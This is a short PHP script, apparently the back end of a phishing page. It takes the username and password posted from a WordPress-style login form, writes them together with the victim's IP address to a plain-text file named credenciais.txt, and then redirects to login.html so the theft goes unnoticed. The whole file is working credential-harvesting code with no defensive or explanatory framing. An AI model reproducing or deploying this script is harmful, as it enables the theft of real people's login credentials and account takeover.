<?php
$user = $_POST['log'];
$pass = $_POST['pwd'];
$ip = $_SERVER['REMOTE_ADDR'];

$credencial = "Usuário: " . $user . ", Senha: " . $pass . ", IP: " . $ip . "\r\n";

$file = fopen('credenciais.txt', 'a');
fprintf($file, $credencial);
fclose($file);

header("location: ./login.html");
?>
